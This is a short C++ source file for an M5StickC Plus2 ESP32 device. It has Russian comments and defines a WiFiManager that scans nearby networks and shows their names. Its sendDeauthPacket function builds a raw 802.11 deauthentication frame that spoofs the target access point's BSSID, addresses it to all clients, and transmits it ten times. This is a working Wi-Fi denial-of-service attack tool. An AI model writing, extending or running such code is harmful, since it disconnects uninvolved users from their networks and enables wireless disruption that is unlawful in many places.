#include "WiFiManager.h"
#include <M5StickCPlus2.h>

void WiFiManager::scanNetworks() {
    int numNetworks = WiFi.scanNetworks();
    M5.Lcd.fillScreen(TFT_WHITE);
    M5.Lcd.setTextColor(TFT_BLACK);

    for (int i = 0; i < numNetworks; i++) {
        String ssid = WiFi.SSID(i);
        M5.Lcd.drawString(ssid, 10, 20 + i * 15);
    }
}

void WiFiManager::sendDeauthPacket() {
    int selectedNetwork = 0; // Идентификатор выбранной сети

    // Получаем BSSID и канал сети
    String bssidStr = WiFi.BSSIDstr(selectedNetwork);
    int channel = WiFi.channel(selectedNetwork);
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("Sending deauth packet on channel %d to BSSID %s\n", channel, bssidStr.c_str());

    uint8_t targetBSSID[6];
    sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &targetBSSID[0], &targetBSSID[1], &targetBSSID[2], 
           &targetBSSID[3], &targetBSSID[4], &targetBSSID[5]);

    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5],
        targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5],
        0x00, 0x00, 0x07, 0x00
    };

    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(100);
    }
}
